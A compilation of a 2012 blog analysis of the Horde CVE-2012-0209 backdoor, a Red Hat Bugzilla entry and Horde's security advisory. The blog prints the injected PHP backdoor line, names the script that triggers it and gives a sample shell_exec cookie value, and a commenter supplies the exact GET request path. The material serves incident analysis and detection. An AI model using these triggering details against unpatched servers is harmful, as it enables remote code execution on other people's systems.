[15/02/2012](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "Permalink to CVE-2012-0209 Horde backdoor analysis")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

[![](https://eromang.zataz.com/wp-content/uploads/horde-color.gif "horde-color")](https://eromang.zataz.com/wp-content/uploads/horde-color.gif)The 13/02 **[Horde](http://www.horde.org/)** team has release a **[security alert](http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155)** concerning their products. An unknown intruder has hack the FTP server of Horde since minimum November 02 2011 and has manipulate three Horde releases to allow unauthenticated remote PHP execution. The intruder has maintain access to the servers until February 7. The issue is currently tracked through **[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)**.

The affected releases are:

* Horde 3.3.12 downloaded between November 15 and February 7
* Horde Groupware 1.2.10 downloaded between November 9 and February 7
* Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

**Horde 4 is not affected**, the CVS and Git repositories seem to not be affected, but some Linux distributions how have download the code source from the Horde FTP server are affected. Horde team is providing version 3.3.13 for Horde, 1.2.11 for Horde Groupware and Horde Groupware Webmail Edition to remove the discovered backdoor and has also clean the FTP server.

After some researches, I found two vulnerable Linux distribution how are delivering the backdoored Horde 3.3.12. These distributions are **[Ubuntu precise](http://packages.ubuntu.com/precise/horde3)**, **[Debian wheezy](http://packages.debian.org/wheezy/horde3)** and **[sid](http://packages.debian.org/sid/horde3)**. **Fedora Rawhide** doesn’t seem to be impacted unless the distributed version is also [3.3.12](https://bugzilla.redhat.com/show_bug.cgi?id=789555), same for **OpenSUSE** 12.1. **Gentoo**, **Mandriva** and **Slackware** doesn’t seem to deliver this version. The impact through Linux distribution should be not so important. Only users how have download the source code from FTP are mainly affected.

The backdoor is located, for Horde 3.3.12, in the “*templates/javascript/open\_calendar.js*” script.

`link.href = '# php (isset($_COOKIE["href"]) && preg_match("/(.*):(.*)/", $_COOKIE["href"], $m))?$m[1]($m[2]):"";?>';`

Take a look on the following **[Pastebin](http://pastebin.com/bcXZYcMb)** for the diff between a clean and a backdoored 3.3.12 version.

As you can see, if the cookie contain an array named “*href*” and if the content of the href variable look like to, for example, “*shell\_exec:’uname -a’*“, the PHP function will be executed. Now that we have found the backdoor, how is this backdoor activated ?

All my previous analysis were false, after trying to exploit without success the backdoor, I have finally discover the vulnerable script.

The vulnerable script is “*/services/javascript.php*“. If you take a look a the script you can see that you need to do a POST request with two variables on the top of the necessary cookie.

 `$app = Util::getFormData('app', Util::nonInputVar('app'));

$file = Util::getFormData('file', Util::nonInputVar('file'));

if (!empty($app) && !empty($file) && strpos($file, '..') === false) {

$script_file = $registry->get('templates', $app) . '/javascript/' . $file;

if (file_exists($script_file)) {

 $registry->pushApp($app, false);

 $script = Util::bufferOutput('require', $script_file);

if ($send_headers) {

Horde::compressOutput();

header('Cache-Control: no-cache');

header('Content-Type: text/javascript');

}

echo $script;

}

}`

“*app*” variable is one of the application how is active on the Horde installation, the applications are configured in the “*/config/registry.php*” file.

 `$this->applications['horde'] = array(

'fileroot' => dirname(__FILE__) . '/..',

'webroot' => _detect_webroot(),

'initial_page' => 'login.php',

'name' => _("Horde"),

'status' => 'active',

'templates' => dirname(__FILE__) . '/../templates',

'provides' => 'horde',

);`

“*file*” variable should be the backdoored JavaScript file aka “*open\_calendar.js*“. After that you have provide the two variables and the “*href*” cookie, the backdoor is executed. I have develop a PoC in order to exploit the backdoor. You can find this PoC on my **[Pastebin](http://pastebin.com/U3ADiWrP)**.

# Post navigation

[← SUC029 : WordPress TimThumb RFI Web Scanner/Robot](https://eromang.zataz.com/2012/02/13/suc029-wordpress-timthumb-rfi-web-scannerrobot/) [CVE-2010-0842 Java MixerSequencer Vulnerability Metasploit Demo →](https://eromang.zataz.com/2012/02/17/cve-2010-0842-java-mixersequencer-vulnerability-metasploit-demo/)

## 3 thoughts on “CVE-2012-0209 Horde backdoor analysis”

1. Pingback: [Trojan in Horde 3.3.12, Horde Groupware 1.2.10, and Horde Groupware Webmail Edition 1.2.10 | Web Security Watch](http://www.websecuritywatch.com/trojan-in-horde-3-3-12-horde-groupware-1-2-10-and-horde-groupware-webmail-edition-1-2-10/)
3. **Tester0** says:
   [13/03/2012 at 11:12](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/#comment-7846)

   Hey I obtained <http://pear.php.net/package/HTTP_Request2/download>

   which was probably missing in my setup.

   Still your PoC neither sends any packer nor returns any error. I am on Win XP.

   What am I missing ?

   Any inputs ?
5. **[Michael Meyer](http://www.greenbone.net)** says:
   [17/02/2012 at 10:30](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/#comment-7197)

   > If you take a look a the script you can see that you need to do a POST request with two variables on > the top of the necessary cookie.

   It does not matter whether a POST or a GET request is sent.

   services/javascript.php

   $app = Util::getFormData(‘app’, Util::nonInputVar(‘app’));

   $file = Util::getFormData(‘file’, Util::nonInputVar(‘file’));

   then in

   “ib/Horde/Util.php”

   function getFormData($var, $default = null){

   return (($val = Util::getPost($var)) !== null)

   ? $val : Util::getGet($var, $default);

   }

   So a simple GET request to ‘/services/javascript.php?app=horde&file=open\_calendar.js’ with the necessary cookie will work too.

Comments are closed.

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from bugzilla.redhat.com_43706376_20250125_034616.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D790877)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D790877)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D790877)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 790877

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 790877**](show_bug.cgi?id=790877)
(CVE-2012-0209)
- [CVE-2012-0209](https://access.redhat.com/security/cve/CVE-2012-0209) Horde 3.3.12 backdoor found in source code

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2012-0209 Horde 3.3.12 backdoor found in source code

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED NOTABUG | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2012-0209 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=790877&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=790877&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2012-02-15 15:52 UTC by Kurt Seifried | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 12:50 UTC ([History](show_activity.cgi?id=790877)) | | [CC List:](page.cgi?id=fields.html#cclist) | 3 users (show)  j maurizio.antillon nb | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-02-15 16:14:54 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=790877#c0)  Kurt Seifried    2012-02-15 15:52:08 UTC  ```  From <http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155>  A few days ago we became aware of a manipulated file on our FTP server. Upon further investigation we discovered that the server has been hacked earlier, and three releases have been manipulated to allow unauthenticated remote PHP execution. We have immediately taken down all distribution servers to further analyze the extent of this incident, and we have worked closely with various Linux distributions to coordinate our response. Since then the FTP and PEAR servers have been replaced and further secured. Clean versions of our releases have been uploaded.  This issue will be tracked as CVE-2012-0209: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209>  We have been able to limit the manipulation to three files downloaded during a certain timeframe. The affected releases are: - Horde 3.3.12 downloaded between November 15 and February 7 - Horde Groupware 1.2.10 downloaded between November 9 and February 7 - Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7  No other releases have been affected. Specifically, no Horde 4 releases were compromised. Our CVS and Git repositories are not affected either. Linux distributions that are affected will notify and provide security releases individually.  If you are not sure whether you are affected or want to verify manually whether you are affected, you can search for this signature in your Horde directory tree:  $m[1]($m[2])  We recommend that all users of the affected version immediately re-install using fresh copies downloaded from our FTP server, or to upgrade to the more recent versions that have been released since then. This is a list of suggested replacements and their MD5 checksums:  bc04ce4499af24a403429c81d0a8afcf ftp://ftp.horde.org/pub/horde/horde-3.3.12.tar.gz 5a0486a5f6f96a9957e770ddabe71b38 ftp://ftp.horde.org/pub/horde/horde-3.3.13.tar.gz 4bdab16c84513bbd9466cb0dc7464661 ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.10.tar.gz fed921b55a8f544fba806333502cd45d ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.11.tar.gz 60e100c3e4ab59c01d30bf5eb813a182 ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.10.tar.gz 6f735266449bfda2cce8b5067b16ff74 ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.11.tar.gz  If you are running Horde 4, you don't need to do anything.  We apologize for the inconvenience and assure you that we are undertaking a full security review of our procedures to prevent this kind of incident from happening again.  If you have further questions, please ask on the Horde mailing list: <http://www.horde.org/community/mail>   ```  [Comment 1](show_bug.cgi?id=790877#c1)  Kurt Seifried    2012-02-15 16:14:54 UTC  ``` We did not ship version 3.3.12 in Fedora or EPEL.   ```  [Comment 2](show_bug.cgi?id=790877#c2)  Tomas Hoger    2012-02-15 16:31:12 UTC  ``` (In reply to [comment #1](show_bug.cgi?id=790877#c1)) > We did not ship version 3.3.12 in Fedora or EPEL.  Horde 3.3.12 was previously available in Fedora Rawhide.  I was added there in August 2011, i.e. before source tarballs were compromised on the upstream FTP server.  MD5 checksum of the source that was imported is bc04ce4499af24a403429c81d0a8afcf:  <http://pkgs.fedoraproject.org/repo/pkgs/horde/horde-3.3.12.tar.gz/> <http://pkgs.fedoraproject.org/gitweb/?p=horde.git;a=commitdiff;h=8a72c4ecee2f85530be09e9cc8e0fc0fda434c60#patch3>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=790877&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from dev.horde.org_3e9acf69_20250125_034609.html ===


6.0.0-git

* [▾
  Tasks](https://tasks.horde.org/)
  + [New Task](https://tasks.horde.org/task.php?actionID=add_task)
  + [Search](https://tasks.horde.org/search.php)

* [Photos](/h/ansel/)

* [Wiki](https://wiki.horde.org/)

* [▾
  Tickets](https://bugs.horde.org/)
  + [New Ticket](https://bugs.horde.org/ticket/create.php)
  + [Search](https://bugs.horde.org/search.php)

* + Toggle Alerts Log
  + [Help](/h/services/help/?module=jonah)

2025-01-25

[ansel](/h/jonah/stories/results.php?tag=ansel&channel_id=1)
[dimp](/h/jonah/stories/results.php?tag=dimp&channel_id=1)
[gollem](/h/jonah/stories/results.php?tag=gollem&channel_id=1)
[groupware](/h/jonah/stories/results.php?tag=groupware&channel_id=1)
[horde](/h/jonah/stories/results.php?tag=horde&channel_id=1)
[imp](/h/jonah/stories/results.php?tag=imp&channel_id=1)
[ingo](/h/jonah/stories/results.php?tag=ingo&channel_id=1)
[kronolith](/h/jonah/stories/results.php?tag=kronolith&channel_id=1)
[mimp](/h/jonah/stories/results.php?tag=mimp&channel_id=1)
[mnemo](/h/jonah/stories/results.php?tag=mnemo&channel_id=1)
[nag](/h/jonah/stories/results.php?tag=nag&channel_id=1)
[passwd](/h/jonah/stories/results.php?tag=passwd&channel_id=1)
[sesha](/h/jonah/stories/results.php?tag=sesha&channel_id=1)
[trean](/h/jonah/stories/results.php?tag=trean&channel_id=1)
[turba](/h/jonah/stories/results.php?tag=turba&channel_id=1)
[webmail](/h/jonah/stories/results.php?tag=webmail&channel_id=1)
[whups](/h/jonah/stories/results.php?tag=whups&channel_id=1)
[wicked](/h/jonah/stories/results.php?tag=wicked&channel_id=1)

# 2012-02-13[SECURITY] Remote execution backdoor after server hack

Tags:A few days ago we became aware of a manipulated file on our FTP server. Upon further investigation we discovered that the server has been hacked earlier, and three releases have been manipulated to allow unauthenticated remote PHP execution.We have immediately taken down all distribution servers to further analyze the extent of this incident, and we have worked closely with various Linux distributions to coordinate our response.

Since then the FTP and PEAR servers have been replaced and further secured. Clean versions of our releases have been uploaded.

This issue will be tracked as CVE-2012-0209: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209>

We have been able to limit the manipulation to three files downloaded during a certain timeframe. The affected releases are:

- Horde 3.3.12 downloaded between November 15 and February 7

- Horde Groupware 1.2.10 downloaded between November 9 and February 7

- Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

No other releases have been affected. Specifically, no Horde 4 releases were compromised. Our CVS and Git repositories are not affected either. Linux distributions that are affected will notify and provide security releases individually.

If you are not sure whether you are affected or want to verify manually whether you are affected, you can search for this signature in your Horde directory tree:

$m[1]($m[2])

We recommend that all users of the affected version immediately re-install using fresh copies downloaded from our FTP server, or to upgrade to the more recent versions that have been released since then. This is a list of suggested replacements and their MD5 checksums:

bc04ce4499af24a403429c81d0a8afcf ftp://ftp.horde.org/pub/horde/horde-3.3.12.tar.gz

5a0486a5f6f96a9957e770ddabe71b38 ftp://ftp.horde.org/pub/horde/horde-3.3.13.tar.gz

4bdab16c84513bbd9466cb0dc7464661 ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.10.tar.gz

fed921b55a8f544fba806333502cd45d ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.11.tar.gz

60e100c3e4ab59c01d30bf5eb813a182 ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.10.tar.gz

6f735266449bfda2cce8b5067b16ff74 ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.11.tar.gz

If you are running Horde 4, you don't need to do anything.

We apologize for the inconvenience and assure you that we are undertaking a full security review of our procedures to prevent this kind of incident from happening again.

If you have further questions, please ask on the Horde mailing list: <http://www.horde.org/community/mail>


